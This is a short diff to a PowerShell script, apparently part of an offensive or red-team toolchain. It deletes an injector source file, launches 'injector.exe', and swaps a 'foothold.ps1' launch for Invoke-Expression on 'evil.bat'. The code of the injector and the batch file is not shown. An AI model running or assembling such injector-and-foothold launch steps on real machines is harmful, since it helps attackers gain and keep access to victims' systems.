@@ -17,4 +17,11 @@ Remove-Item -path "C:\Users\saurav\Desktop\injector1.c"
 #execute the injector.exe
 Start-Process -filepath "C:\Users\saurav\Desktop\injector.exe" 
 
-cmd.exe /c 'powershell -f foothold.ps1'
+#execute batch file
+Invoke-Expression -command "C:\users\saurav\temp\evil.bat"
+
+
+
+
+
+
